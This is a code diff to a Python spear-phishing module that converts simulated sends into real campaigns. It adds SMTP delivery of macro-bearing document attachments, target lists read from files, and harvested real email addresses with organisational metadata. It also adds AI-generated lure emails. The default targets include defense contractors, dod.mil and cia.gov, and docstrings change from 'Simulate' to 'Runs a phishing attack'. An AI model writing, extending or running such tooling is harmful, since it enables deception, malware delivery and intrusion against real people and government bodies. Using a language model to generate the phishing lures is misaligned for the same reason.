@@ -9,16 +9,19 @@ import random
 import os
 import base64
 import tempfile
-from typing import List, Dict, Any
+from typing import List, Dict, Any, Optional
 from datetime import datetime
 
 from .exploit_intel import enrich_with_exploit_intel
+from .email_repository import EmailRepository, EmailRepositoryError
+from .phishing import send_email
+from .deepseek_integration import generate_phishing_email
 
 
 class SpearPhishingGenerator:
     """Generate real spear-phishing campaigns with payload delivery."""
     
-    def __init__(self):
+    def __init__(self, email_repository: Optional[EmailRepository] = None):
         self.target_domains = [
             "@northropgrumman.com", 
             "@lockheedmartin.com", 
@@ -27,26 +30,65 @@ class SpearPhishingGenerator:
             "@dod.mil",
             "@cia.gov"
         ]
-        self.lure_subjects = [
-            "URGENT: RFQ Response Required - DOD Contract #2024-",
-            "Action Required: Security Clearance Verification Update",
-            "Quarterly Defense Compliance Review - Your Signature Needed",
-            "FINAL NOTICE: Cybersecurity Policy Update Required",
-            "Immediate Action: Software Patch Deployment"
-        ]
+        self.email_repo: Optional[EmailRepository] = None
+        try:
+            self.email_repo = email_repository or EmailRepository()
+        except EmailRepositoryError:
+            self.email_repo = None
     
     def generate_email(self, target_domain: str = None, include_payload: bool = True) -> Dict[str, Any]:
         """Generate a spear-phishing email with optional payload."""
-        domain = target_domain or random.choice(self.target_domains)
-        subject = random.choice(self.lure_subjects)
-        
+        selected_email = None
+        domain_hint = None
+        if target_domain:
+            domain_hint = target_domain.lower().lstrip("@")
+
+        if self.email_repo:
+            if domain_hint:
+                selected_email = self.email_repo.random_email(domain=domain_hint)
+            if not selected_email:
+                selected_email = self.email_repo.random_email()
+
+        if selected_email:
+            domain = selected_email.get("domain") or selected_email["email"].split("@")[-1]
+            domain_with_at = f"@{domain}"
+            target_address = selected_email["email"]
+            metadata = {
+                key: selected_email.get(key)
+                for key in [
+                    "organization",
+                    "country",
+                    "state",
+                    "city",
+                    "confidence_score",
+                    "email_type",
+                    "num_sources",
+                ]
+            }
+            metadata["sample_record"] = selected_email.get("sample_record", {})
+        else:
+            if target_domain:
+                domain_with_at = target_domain if target_domain.startswith("@") else f"@{target_domain}"
+            else:
+                domain_with_at = random.choice(self.target_domains)
+            domain = domain_with_at.lstrip("@")
+            target_address = f"executive{domain_with_at}"
+            metadata = {}
+
+        phishing_content = generate_phishing_email(domain)
+        subject = phishing_content["subject"]
+        body = phishing_content["body"]
+
         email = {
             "subject": subject,
-            "sender": f"security-team{domain}",
-            "target_domain": domain,
+            "body": body,
+            "sender": f"security-team{domain_with_at}",
+            "target_domain": domain_with_at,
+            "target_email": target_address,
             "malicious_attachment": "document_with_macro.docx" if include_payload else None,
             "payload_type": "VBA Macro" if include_payload else "None",
-            "delivery_method": "Email attachment"
+            "delivery_method": "Email attachment",
+            "target_metadata": metadata,
         }
         
         if include_payload:
@@ -97,18 +139,6 @@ End Sub'''
             f.write(self._generate_malicious_macro())
         
         return doc_path
-    
-    def send_phishing_email(self, target_email: str, email_content: Dict[str, Any]) -> Dict[str, Any]:
-        """Simulate sending a phishing email (placeholder for real implementation)."""
-        result = {
-            "target_email": target_email,
-            "status": "sent",
-            "delivery_time": datetime.now().isoformat(),
-            "email_subject": email_content["subject"],
-            "attachment_sent": email_content.get("malicious_attachment") is not None
-        }
-        
-        return result
 
 
 class SupplyChainCompromise:
@@ -243,7 +273,7 @@ def analyze_spear_phishing_campaign() -> Dict[str, Any]:
     )
 
 
-def deliver_payload(target_email: str, payload_type: str = "document") -> Dict[str, Any]:
+def deliver_payload(target_email: str, smtp_config: Dict[str, Any], payload_type: str = "document") -> Dict[str, Any]:
     """Deliver payload to target via email."""
     generator = SpearPhishingGenerator()
     
@@ -252,10 +282,19 @@ def deliver_payload(target_email: str, payload_type: str = "document") -> Dict[s
         include_payload=True
     )
     
-    delivery_result = generator.send_phishing_email(target_email, email_content)
+    send_email(
+        sender_email=smtp_config["user"],
+        sender_password=smtp_config["password"],
+        receiver_email=target_email,
+        subject=email_content["subject"],
+        body=email_content["body"],
+        attachment_path=email_content.get("payload_file"),
+        smtp_server=smtp_config["server"],
+        smtp_port=smtp_config["port"],
+    )
     
     result = {
-        "delivery_result": delivery_result,
+        "delivery_result": {"status": "sent", "target_email": target_email},
         "payload_details": {
             "type": payload_type,
             "file": email_content.get("payload_file"),
@@ -272,32 +311,45 @@ def deliver_payload(target_email: str, payload_type: str = "document") -> Dict[s
     )
 
 
-def phishing_attack(target_list_file: str) -> Dict[str, Any]:
-    """Simulate a phishing attack targeting a list of employees."""
-    print(f"[+] Simulating phishing attack using target list: {target_list_file}")
+def phishing_attack(target_list_file: str, smtp_config: Dict[str, Any]) -> Dict[str, Any]:
+    """Runs a phishing attack against a list of targets."""
+    print(f"[+] Starting phishing attack using target list: {target_list_file}")
     
-    # Simulate reading target list
-    targets = [
-        f"user{i}@targetcompany.com" for i in range(1, 6)
-    ]
-    
+    try:
+        with open(target_list_file, 'r') as f:
+            targets = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        print(f"[-] Target list file not found: {target_list_file}")
+        return {}
+
     generator = SpearPhishingGenerator()
     results = []
     
     for target in targets:
         email_content = generator.generate_email(include_payload=True)
-        delivery_result = generator.send_phishing_email(target, email_content)
+        
+        send_email(
+            sender_email=smtp_config["user"],
+            sender_password=smtp_config["password"],
+            receiver_email=target,
+            subject=email_content["subject"],
+            body=email_content["body"],
+            attachment_path=email_content.get("payload_file"),
+            smtp_server=smtp_config["server"],
+            smtp_port=smtp_config["port"]
+        )
+        
         results.append({
             "target": target,
             "email_subject": email_content["subject"],
-            "status": delivery_result["status"]
+            "status": "sent"
         })
     
     summary = {
         "attack_type": "Spear Phishing",
         "target_list_file": target_list_file,
         "targets_contacted": len(results),
-        "successful_deliveries": len([r for r in results if r["status"] == "sent"]),
+        "successful_deliveries": len(results),
         "payload_type": "Malicious Document with Macro",
         "campaign_results": results
     }
